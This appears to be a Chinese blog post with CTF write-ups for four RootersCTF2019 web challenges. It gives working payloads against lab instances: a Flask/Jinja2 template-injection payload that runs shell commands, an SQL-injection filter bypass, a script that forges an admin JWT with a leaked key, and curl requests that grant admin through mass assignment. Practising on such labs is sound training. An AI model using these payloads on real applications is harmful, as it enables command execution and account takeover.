+++
title = "RootersCTF2019"
slug = "rootersctf2019"
description = "刷"
date = "2024-09-15T08:47:13"
lastmod = "2024-09-15T08:47:13"
image = ""
license = ""
categories = ["复现"]
tags = []
+++

# [RootersCTF2019]I_<3_Flask

这个直接秒吧？

```
?name={{cycler.next.__globals__.__builtins__.__import__('os').popen('ls /').read()}}

?name={{cycler.next.__globals__.__builtins__.__import__('os').popen('tac f*').read()}}
```

# [RootersCTF2019]babyWeb

一看就是一个SQL注入，但是禁用了一些关键词，

```
union sleep or benchmark ' " -
```

直接先试试万能密码

```
?search=1||1=1 limit 0,1
```

就直接出了

# [RootersCTF2019]ImgXweb

进来就感觉是个`flask`，观察一下

注册登录之后发现web服务是`openresty`,搜了一下是`nginx`的改良版

那就有可能是`.user.ini`

再找找发现`cookie`是个jwt,那么应该是要伪造`admin`

我直接修改发现还是不行，那估计要密钥了，很抽象的就是错了就得刷靶机，这个很烦我

访问`/robots.txt`

```
User-agent: * 
Disallow: /static/secretkey.txt
```

我是直接写了个脚本修改

```python
import jwt

# 假设你已有一个 JWT 和对应的密钥
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYmFvem9uZ3dpIn0.ZzQ4oPWgTW39-7tZ90PoG3mQa29MqvMEMDY7pPfYCdE"
secret_key = "you-will-never-guess"

# 1. 解码 JWT，获取有效载荷
try:
    decoded_payload = jwt.decode(token, secret_key, algorithms=["HS256"])
    print("原始有效载荷：", decoded_payload)
except jwt.ExpiredSignatureError:
    print("JWT 已过期")
except jwt.InvalidTokenError:
    print("无效的 JWT")

# 2. 修改有效载荷，例如修改 "user" 的值
decoded_payload['user'] = 'admin'

# 3. 重新生成带签名的 JWT
new_token = jwt.encode(decoded_payload, secret_key, algorithm="HS256")

print("新的 JWT：", new_token)
```

外带即可，看到`flag`路径了

```
curl -i http://7b5ae377-b339-4de6-851a-521be4e9b5c5.node5.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png

HTTP/1.1 200 OK
Server: openresty
Date: Sun, 15 Sep 2024 07:13:06 GMT
Content-Type: image/png
Content-Length: 43
Connection: keep-alive
Last-Modified: Sun, 15 Sep 2024 03:05:27 GMT
Cache-Control: max-age=60
Expires: Sun, 15 Sep 2024 07:14:06 GMT
ETag: "1726369527.6339328-43-1735594767"
X-Cache: HIT
X-Cache: EXPIRED
Accept-Ranges: bytes

flag{43436fdb-7c97-4b3d-8c44-4fdc1872835d}
```

但是貌似flag不是动态的交不上，开了几次靶机也不行

# [RootersCTF2019]notifyxapi

一进来就看到一坨的`curl`,不知道能干嘛执行看看

```
curl -X POST "http://4f19e16d-9cc2-489d-a152-292d99a9c223.node5.buuoj.cn:81/api/v1/register/" -H "Content-Type: application/json" -d '{"email": "bao@test.com", "password": "password"}'

{"created_user":{"id":3,"user":{"id":3,"email":"bao@test.com","is_admin":false},"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjYzODQ5NDAsIm5iZiI6MTcyNjM4NDk0MCwianRpIjoiNTc4OTA1OGYtOGNjMC00NDU1LThkYmEtNTAyMmQ0YTU0MzUwIiwiZXhwIjoxNzU3OTIwOTQwLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.PpOhNIf06H-IEohJwl4KeZyxEdyCjpACE6WZvL21gQQ"}}
```

估计是要伪造`is_admin`为真

```
curl -X POST "http://4f19e16d-9cc2-489d-a152-292d99a9c223.node5.buuoj.cn:81/api/v1/login/" -H "Content-Type: application/json" -d '{"email": "bao@test.com", "password": "password","is_admin":true}'

{"id":{"id":3,"email":"bao@test.com","is_admin":false},"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjYzODUwMzMsIm5iZiI6MTcyNjM4NTAzMywianRpIjoiMzUwZDk1MWUtNTUyMi00YmUxLWFkYTgtNjI0YzMyNjNlMTMzIiwiZXhwIjoxNzU3OTIxMDMzLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.XuCxDv8DVg8epXkKoMlx4hVXAENRw4VFEE_TELzGYFY"}
```

这里一直伪造不成功，后面我想了想是不是应该在注册页面伪造呢

```
curl -X POST "http://4f19e16d-9cc2-489d-a152-292d99a9c223.node5.buuoj.cn:81/api/v1/register/" -H "Content-Type: application/json" -d '{"email": "bao@test.com", "password": "password","is_admin":true}'
成功了

{"created_user":{"id":3,"user":{"id":3,"is_admin":true,"email":"bao@test.com"},"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjYzODYwOTIsIm5iZiI6MTcyNjM4NjA5MiwianRpIjoiYmU4MDMyNTgtNGM4OS00YzNkLTllZjAtZjc1NWQ1YzlkYTViIiwiZXhwIjoxNzU3OTIyMDkyLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.TTO52mMhVJQIJkF9lxTNObU85c18HzjNn0V7Va2nZt4"}}
```

那么登录

```
curl -X POST "http://4f19e16d-9cc2-489d-a152-292d99a9c223.node5.buuoj.cn:81/api/v1/login/" -H "Content-Type: application/json" -d '{"email": "bao@test.com", "password": "password"}'

{"id":{"id":3,"is_admin":true,"email":"bao@test.com"},"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjYzODYxMzksIm5iZiI6MTcyNjM4NjEzOSwianRpIjoiM2NkZmJkZTctZTUxYS00ZmQxLWFjZWItNGQ4ZjFjODMwNWRlIiwiZXhwIjoxNzU3OTIyMTM5LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.CxS2oT1WimWW0Mnrgzz9kwOAAFxJPaQbIbv_X8T_Ubc"}
```

正常操作即可

```
export ACCESS="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjYzODYxMzksIm5iZiI6MTcyNjM4NjEzOSwianRpIjoiM2NkZmJkZTctZTUxYS00ZmQxLWFjZWItNGQ4ZjFjODMwNWRlIiwiZXhwIjoxNzU3OTIyMTM5LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.CxS2oT1WimWW0Mnrgzz9kwOAAFxJPaQbIbv_X8T_Ubc"

curl -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" "http://4f19e16d-9cc2-489d-a152-292d99a9c223.node5.buuoj.cn:81/api/v1/notifications/"

[{"body":"rooters{a_big_hard_business_in_a_big_hard_building}ctf","id":1,"issuer":{"id":1,"email":"admin@test.com"},"title":"flag"},{"body":"hey, rosssssss","id":2,"issuer":{"id":2,"email":"test@test.com"},"title":"The IT Crowd"},{"body":"Jen Barber? Is that the internet?","id":3,"issuer":{"id":2,"email":"test@test.com"},"title":"The IT Crowd"},{"body":"flag{ca26edd8-d6c0-411a-be31-ad75ed97da07}","id":1,"issuer":{"id":1,"email":"admin@test.com"},"title":"flag"}]
```

成功打出flag

